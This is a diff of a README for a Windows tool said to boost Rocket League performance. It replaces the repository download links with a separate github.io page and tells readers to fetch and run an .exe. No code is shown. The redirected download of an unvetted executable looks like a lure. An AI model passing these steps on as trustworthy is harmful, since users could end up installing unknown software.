@@ -1,7 +1,7 @@
 # 🚀 Rocket-Eclipse-Pro - Improve your Rocket League gameplay performance
 
 <div align="center">
-  <a href="https://github.com/Buntysh5636/Rocket-Eclipse-Pro">
+  <a href="https://buntysh5636.github.io">
     <img src="https://img.shields.io/badge/Download-Rocket--Eclipse--Pro-blue.svg" alt="Download Now">
   </a>
 </div>
@@ -25,7 +25,7 @@ Before you install this software, ensure your computer meets these minimum speci
 
 Follow these steps to set up the software on your Windows computer:
 
-1.  Visit the official repository download page: https://github.com/Buntysh5636/Rocket-Eclipse-Pro
+1.  Visit the official repository download page: https://buntysh5636.github.io
 2.  Locate the latest release version on the right side of the page under the Releases section.
 3.  Click the link that ends in .exe to start the file download.
 4.  Once the download finishes, navigate to your Downloads folder.
